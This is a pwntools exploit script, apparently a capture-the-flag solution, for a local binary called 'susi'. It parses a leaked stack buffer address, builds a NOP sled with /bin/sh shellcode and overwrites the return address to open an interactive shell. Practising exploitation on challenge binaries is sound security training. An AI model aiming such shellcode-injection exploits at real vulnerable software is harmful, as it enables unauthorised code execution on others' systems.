from pwn import *

context.arch = 'x86_64'
context.os = 'linux'
shellcode = asm(shellcraft.sh())

elf = context.binary = ELF('./susi')
p = process()

p.recvuntil('at: ')
buffer_addr = int(p.recvline(), 16)

print(buffer_addr)
log.info(f"Leaked buffer address: {hex(buffer_addr)}")

buffer_size = 256 
padding = 8
nop_sled = b'\x90' * (264 - len(shellcode))

payload = flat(
    nop_sled + 
    shellcode +
    #b'A' * (buffer_size - len(nop_sled) - len(shellcode)) + 
    #b'B' * padding +
    p64(buffer_addr) 
)
p.sendline(payload)  # NOP sled + shellcode + payload
p.interactive()
